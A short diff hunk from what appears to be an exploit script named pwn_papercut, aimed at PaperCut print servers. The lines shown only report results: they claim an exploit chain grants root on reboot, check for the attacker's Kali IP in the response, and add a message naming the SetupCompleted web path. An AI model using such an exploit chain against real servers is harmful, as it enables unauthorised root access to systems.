@@ -106,6 +106,7 @@ def pwn_papercut(target, kali_ip):
 
     if "Saved successfully" in r_final.text:
         print("[+] SUCCESS: Exploit chain deployed! Root access will be granted on reboot.")
+        print(f"    Web UI is available via 'http://{target}:9191/app?service=page/SetupCompleted'.")
     elif kali_ip in r_final.text:
         print("[+] SUCCESS: Payload verified in response! Check UI.")
     else:
